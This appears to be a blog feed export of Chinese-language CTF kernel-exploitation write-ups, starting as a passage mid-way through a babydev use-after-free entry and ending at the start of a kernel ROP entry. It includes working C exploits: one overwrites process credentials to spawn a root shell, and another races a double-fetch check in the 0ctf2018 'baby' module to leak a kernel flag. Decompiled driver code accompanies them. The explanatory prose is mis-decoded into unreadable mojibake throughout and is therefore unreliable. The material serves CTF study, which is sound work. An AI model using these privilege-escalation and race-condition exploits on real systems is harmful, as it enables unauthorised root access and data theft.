 *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> KERNEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel_pwn Double_fetch</title>
      <link href="/2020/11/08/kernel_pwn(2)/"/>
      <url>/2020/11/08/kernel_pwn(2)/</url>
      
        <content type="html"><![CDATA[<h3 id="kernel-pwn-Double-fetch"><a href="#kernel-pwn-Double-fetch" class="headerlink" title="kernel_pwn Double_fetch"></a>kernel_pwn Double_fetch</h3><blockquote><p>wikiä¸Škerneléƒ¨åˆ†çš„ç¬¬ä¸‰é“é¢˜ç›®ï¼Œæ¥è‡ª0ctf2018 final_baby</p></blockquote><span id="more"></span><p>è¿™é¢˜ä¸å¤ªä¸€æ ·çš„æ˜¯æ²¡æœ‰ç»™bzlmage,åªç»™äº†.koæ–‡ä»¶å’Œcore.cpioã€‚é€šè¿‡idaæ‰“å¼€koæ–‡ä»¶æŸ¥çœ‹hex viewå¯ä»¥å‘ç°å†…æ ¸ç‰ˆæœ¬ä¸º4.15.0-22-generic SMP mod_unloadã€‚<br>æˆ‘å·æ‡’ç›´æ¥ä»p4ndaå¸ˆå‚…çš„githubä¸Šæäº†ä¸€ä¸ªï¼Œå†™ä¸ªshellæ–‡ä»¶å°±å¯ä»¥qemuèµ·äº†ã€‚</p><p>.koæ–‡ä»¶åˆ†æï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  misc_register(&amp;baby);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>init_module()é‡Œæ‰§è¡Œäº†misc_register()åœ¨&#x2F;devç›®å½•ä¸‹å»ºç«‹äº†babyç»“ç‚¹ï¼Œå¹¶å®šä¹‰ä¸ºæ‚é¡¹è®¾å¤‡ï¼Œè¯¥è®¾å¤‡å…±äº«ä¸»è®¾å¤‡å·å’Œopenå‡½æ•°è°ƒç”¨ï¼Œæœ‰ç‚¹ç±»ä¼¼ä¸Šä¸€ç¯‡çš„coreã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">baby_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// kr10_8</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0x6666</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag, v2, v3);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">0x1337</span></span><br><span class="line">         &amp;&amp; (<span class="type">unsigned</span> __int8)_chk_range_not_ok(</span><br><span class="line">                               v2,</span><br><span class="line">                               <span class="number">16LL</span>,</span><br><span class="line">                               *(_QWORD *)(__readgsqword((<span class="type">unsigned</span> __int64)&amp;current_task) + <span class="number">4952</span>)) != <span class="number">1</span></span><br><span class="line">         &amp;&amp; (<span class="type">unsigned</span> __int8)_chk_range_not_ok(</span><br><span class="line">                               *(_QWORD *)v7,</span><br><span class="line">                               *(<span class="type">int</span> *)(v7 + <span class="number">8</span>),</span><br><span class="line">                               *(_QWORD *)(__readgsqword((<span class="type">unsigned</span> __int64)&amp;current_task) + <span class="number">4952</span>)) != <span class="number">1</span></span><br><span class="line">         &amp;&amp; *(_DWORD *)(v7 + <span class="number">8</span>) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="built_in">strlen</span>(flag) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= v5 - <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v7 + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag, flag, ~v5);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">14LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>baby_ioctl()å°±ç±»ä¼¼äºmainå‡½æ•°äº†ï¼Œä¸»è¦å®Œæˆçš„åŠŸèƒ½æ˜¯å¯¹ç¬¬äºŒä¸ªå‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œè‹¥ä¸º0x6666ï¼Œå°±è¾“å‡ºå†…æ ¸é‡Œflagçš„åœ°å€ï¼›å¦‚æœä¸º0x1337å°±ä¼šè¿›è¡Œä¸‰ä¸ªæ£€æŸ¥_chk_range_not_ok()å‡½æ•°å°±æ˜¯æ£€æŸ¥a1+a2&gt;a3æ˜¯å¦æˆç«‹ã€‚</p><p>å¯„å­˜å™¨çŠ¶æ€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$rdx   : 0x00007ffffffff000  â†’  0x00007ffffffff000</span><br><span class="line">$rsi   : 0x0000000000000010  â†’  0x0000000000000010</span><br><span class="line">$rdi   : 0x00007ffd64e1d780  â†’  0x00007ffd64e1d790  â†’  0x6373205d30383138  â†’  0x6373205d30383138</span><br><span class="line"></span><br><span class="line">gefâ¤  x/20gx 0x00007ffd64e1d780</span><br><span class="line">0x7ffd64e1d780:0x00007ffd64e1d7900x0000000000000021   //ä¼ å…¥çš„ç»“æ„ä½“</span><br></pre></td></tr></table></figure><p>é€šè¿‡è°ƒè¯•æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œv2&#x2F;v7å°±æ˜¯æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ç»“æ„ä½“ï¼Œè€Œa3åˆ™æ˜¯ä¸€ä¸ªå›ºå®šçš„åœ°å€0x7ffffffff000ï¼Œè¿™ä¸ªåœ°å€æ˜¯ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´çš„è¾¹ç•Œåœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æƒ³åˆ°è¯¥å‡½æ•°å°±æ˜¯åˆ¤æ–­a1+a2çš„æ˜¯å¦åœ¨ç”¨æˆ·ç©ºé—´ã€‚<br>ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *flag;   <span class="comment">//flagçš„åœ°å€</span></span><br><span class="line">    <span class="type">size_t</span> flag_len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªcheckæ˜¯æˆ‘ä»¬è¾“å…¥çš„ç»“æ„ä½“æ˜¯å¦åœ¨ç”¨æˆ·ç©ºé—´ï¼Œç¬¬äºŒä¸ªcheckæ˜¯flagæ˜¯å¦åœ¨ç”¨æˆ·ç©ºé—´ï¼Œç¬¬ä¸‰ä¸ªcheckæ˜¯æˆ‘ä»¬ç»“æ„ä½“çš„flag_lenæ˜¯å¦å’ŒçœŸæ­£flagé•¿åº¦ç›¸ç­‰ã€‚<br>è¿‡äº†checkä¹‹åä¼šå°†æˆ‘ä»¬è¾“å…¥çš„flagçš„åœ°å€é‡Œçš„å†…å®¹å’Œå†…æ ¸é‡Œçš„flagè¿›è¡Œæ¯”è¾ƒï¼Œç›¸åŒæœ€ç»ˆå°±ä¼šè¾“å‡ºflagã€‚<br>åˆ†æä¸‹æ¥æˆ‘ä»¬å‘ç°ï¼Œå†…æ ¸å¾—åˆ°çš„æ˜¯ä¸€ä¸ªç»“æ„ä½“çš„æŒ‡é’ˆï¼Œè€Œç»“æ„ä½“çš„å†…å®¹æ˜¯å­˜æ”¾åœ¨ç”¨æˆ·ç©ºé—´çš„ã€‚æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡0x6666å¾—åˆ°flagåœ¨å†…æ ¸é‡Œçš„åœ°å€ï¼Œä½†å¦‚æœæˆ‘ä»¬åœ¨ä¼ å…¥çš„ç»“æ„ä½“é‡Œå†™å…¥è¯¥åœ°å€çš„è¯å°±æ— æ³•é€šè¿‡ç¬¬äºŒä¸ªcheckï¼ˆå› ä¸ºè¯¥flagåœ¨å†…æ ¸ç©ºé—´ï¼‰ã€‚è¿™é‡Œå°±ç”¨åˆ°äº†doubel_fetchæ–¹æ³•ã€‚<br>åŸç†æ‘˜è‡ªCTF_WIKIï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Double Fetch ä»æ¼æ´åŸç†ä¸Šå±äºæ¡ä»¶ç«äº‰æ¼æ´ï¼Œæ˜¯ä¸€ç§å†…æ ¸æ€ä¸ç”¨æˆ·æ€ä¹‹é—´çš„æ•°æ®è®¿é—®ç«äº‰ã€‚</span><br><span class="line"></span><br><span class="line">åœ¨ Linux ç­‰ç°ä»£æ“ä½œç³»ç»Ÿä¸­ï¼Œè™šæ‹Ÿå†…å­˜åœ°å€é€šå¸¸è¢«åˆ’åˆ†ä¸ºå†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´ã€‚å†…æ ¸ç©ºé—´è´Ÿè´£è¿è¡Œå†…æ ¸ä»£ç ã€é©±åŠ¨æ¨¡å—ä»£ç ç­‰ï¼Œæƒé™è¾ƒé«˜ã€‚è€Œç”¨æˆ·ç©ºé—´è¿è¡Œç”¨æˆ·ä»£ç ï¼Œå¹¶é€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸å®Œæˆç›¸å…³åŠŸèƒ½ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·ç©ºé—´å‘å†…æ ¸ä¼ é€’æ•°æ®æ—¶ï¼Œå†…æ ¸å…ˆé€šè¿‡é€šè¿‡ copy_from_user ç­‰æ‹·è´å‡½æ•°å°†ç”¨æˆ·æ•°æ®æ‹·è´è‡³å†…æ ¸ç©ºé—´è¿›è¡Œæ ¡éªŒåŠç›¸å…³å¤„ç†ï¼Œä½†åœ¨è¾“å…¥æ•°æ®è¾ƒä¸ºå¤æ‚æ—¶ï¼Œå†…æ ¸å¯èƒ½åªå¼•ç”¨å…¶æŒ‡é’ˆï¼Œè€Œå°†æ•°æ®æš‚æ—¶ä¿å­˜åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œåç»­å¤„ç†ã€‚æ­¤æ—¶ï¼Œè¯¥æ•°æ®å­˜åœ¨è¢«å…¶ä»–æ¶æ„çº¿ç¨‹ç¯¡æ”¹é£é™©ï¼Œé€ æˆå†…æ ¸éªŒè¯é€šè¿‡æ•°æ®ä¸å®é™…ä½¿ç”¨æ•°æ®ä¸ä¸€è‡´ï¼Œå¯¼è‡´å†…æ ¸ä»£ç æ‰§è¡Œå¼‚å¸¸ã€‚</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆåœ¨ç»“æ„ä½“çš„flagä½ç½®å†™å…¥ç”¨æˆ·ç©ºé—´çš„åœ°å€ï¼Œåœ¨åˆ›å»ºä¸€ä¸ªæ¶æ„çº¿ç¨‹ï¼Œè¯¥çº¿ç¨‹çš„ä»»åŠ¡å°±æ˜¯ä¸æ–­çš„ä¿®æ”¹æˆ‘ä»¬çš„flagåœ°å€ä¸ºå†…æ ¸åœ°å€ï¼Œå¦‚æœè¯¥ä¿®æ”¹æ“ä½œå‘ç”Ÿåœ¨é€šè¿‡checkåï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡åé¢çš„ä¾æ¬¡æ¯”è¾ƒä»è€Œè¾“å‡ºflagã€‚</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> finish=<span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> addr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *flag;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_attr</span><span class="params">(<span class="type">void</span> *s)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> *<span class="title">s1</span>=</span>s;</span><br><span class="line">    <span class="keyword">if</span>(finish==<span class="number">0</span>)&#123;</span><br><span class="line">        s1-&gt;flag=addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> <span class="title">t</span>;</span></span><br><span class="line">    <span class="type">pthread_t</span> t1;</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/record.txt&quot;</span>);</span><br><span class="line">    <span class="type">int</span> addr_fd=open(<span class="string">&quot;/tmp/record.txt&quot;</span>,O_RDONLY);</span><br><span class="line">    lseek(addr_fd,<span class="number">-0x1000</span>,SEEK_END);   <span class="comment">//control the position of r/w</span></span><br><span class="line">    read(addr_fd,buf,<span class="number">0x1000</span>);</span><br><span class="line">    close(addr_fd);</span><br><span class="line">    ptr=<span class="built_in">strstr</span>(buf,<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(ptr==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Not found&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        ptr+=<span class="number">16</span>;</span><br><span class="line">        addr=strtoull(ptr,ptr+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;flag addr: %p&quot;</span>,addr);</span><br><span class="line">    &#125;</span><br><span class="line">    t.flag=buf;</span><br><span class="line">    t.len=<span class="number">33</span>;</span><br><span class="line">    pthread_create(&amp;t1,<span class="literal">NULL</span>,change_attr,&amp;t);   <span class="comment">//åˆ›å»ºçº¿ç¨‹</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x500</span>;i++)&#123;</span><br><span class="line">        ioctl(fd,<span class="number">0x1337</span>,&amp;t);</span><br><span class="line">        t.flag=buf;     <span class="comment">//æ›´æ–°flagåœ°å€å¢å¤§æˆåŠŸæ¦‚ç‡</span></span><br><span class="line">    &#125;</span><br><span class="line">    finish=<span class="number">1</span>;</span><br><span class="line">    pthread_join(t1,<span class="literal">NULL</span>);   <span class="comment">//ç­‰å¾…çº¿ç¨‹ç»“æŸ</span></span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¡¥å……ï¼š<br>ç¼–è¯‘æ—¶è¦å¤šåŠ -pthreadé€‰é¡¹<code>gcc exp.c -pthread -static -o exploit</code><br>gef attachçš„å‘½ä»¤<code>gef-remote -q localhost:1234</code><br>å…³é—­åœ°å€éšæœºåŒ–æ–¹æ³•ï¼š<br>åœ¨-appendæœ€ååŠ ä¸Š nokaslr</p><p>å‚è€ƒï¼š<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch-zh/</a><br><a href="https://x3h1n.github.io/2019/08/27/20180ctf-final-baby/">https://x3h1n.github.io/2019/08/27/20180ctf-final-baby/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> KERNEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel_pwn ROP</title>
      <link href="/2020/11/07/kernel_pwn(1)/"/>
      <url>/2020/11/07/kernel_pwn(1)/</url>
      
        <content type="html"><![CDATA[<h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><blockquote><p>é€šå¸¸ä¸€ä¸ªå†…æ ¸ç”±è´Ÿè´£å“åº”ä¸­æ–­çš„ä¸­æ–­æœåŠ¡ç¨‹åºï¼Œè´Ÿè´£ç®¡ç†å¤šä¸ªè¿›ç¨‹ä»è€Œåˆ†äº«å¤„ç†å™¨æ—¶é—´çš„è°ƒåº¦ç¨‹åºï¼Œè´Ÿè´£ç®¡ç†è¿›ç¨‹åœ°å€ç©ºé—´çš„å†…å­˜ç®¡ç†ç¨‹åºï¼Œè¿›ç¨‹é—´é€šè®¯ç­‰ç³»ç»ŸæœåŠ¡ç¨‹åºå…±åŒç»„æˆã€‚  â€“linuxå†…æ ¸è®¾è®¡ä¸å®ç°</p></blockquote><p>ä¸€ç›´æƒ³å­¦kernel pwnï¼Œä½†è¿Ÿè¿Ÿæ²¡æœ‰å¼€å§‹ï¼ˆæ‡’ğŸ¤¦ï¼‰ã€‚æœ€è¿‘åˆå¿ƒè¡€æ¥æ½®ï¼Œç¿»å¼€äº†<code>linuxå†…æ ¸è®¾è®¡ä¸å®ç°</code>è¿™æœ¬ä¹¦ï¼Œå‡†å¤‡çœ‹è¿™æœ¬æ¥å…¥é—¨kernelã€‚è¿™å°†ä¼šæ˜¯ä¸€ä¸ªç³»åˆ—ï¼Œè®°å½•ä¸‹è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ï¼ˆè¯»ä¹¦ç¬”è®°+kernel_pwné¢˜ç›®å¤ç°ï¼‰ï¼Œå¸Œæœ›è‡ªå·±å¯ä»¥åšæŒä¸‹å»ğŸƒã€‚</p><span id="more"></span><p>kernelé¡¾åæ€ä¹‰æ˜¯æ“ä½œçš„æ ¸å¿ƒï¼Œå®ƒå…¶å®èµ·åˆ°äº†ä¸€ä¸ªæ‰¿ä¸Šï¼ˆç”¨æˆ·ç©ºé—´ï¼‰å¯ä¸‹ï¼ˆç¡¬ä»¶è®¾å¤‡ï¼‰çš„ä½œç”¨ã€‚åº”ç”¨ç¨‹åºé€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥ä¸å†…æ ¸é€šä¿¡ï¼Œå†…æ ¸é€šè¿‡å¤„ç†ä¸­æ–­ï¼ˆé€šè¿‡ä¸­æ–­å·æ‰¾ä¸­æ–­æœåŠ¡ç¨‹åºï¼‰æ¥ç®¡ç†ç³»ç»Ÿçš„ç¡¬ä»¶è®¾å¤‡ã€‚<br>æ³¨æ„ï¼šå¾ˆå¤šæ“ä½œç³»ç»Ÿçš„ä¸­æ–­æœåŠ¡ç¨‹åºï¼ŒåŒ…æ‹¬linuxï¼Œéƒ½ä¸åœ¨è¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼›è€Œæ˜¯åœ¨ä¸“é—¨çš„ä¸­æ–­ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œä¸æ‰€æœ‰è¿›ç¨‹éƒ½æ— å…³ã€‚</p><h4 id="kernel-pwn-ROP"><a href="#kernel-pwn-ROP" class="headerlink" title="kernel_pwn_ROP"></a>kernel_pwn_ROP</h4><blockquote><p>é¢˜ç›®æ¥è‡ªqwd2018_coreã€‚</p></blockquote><p>å°±ctfé‡Œkernel 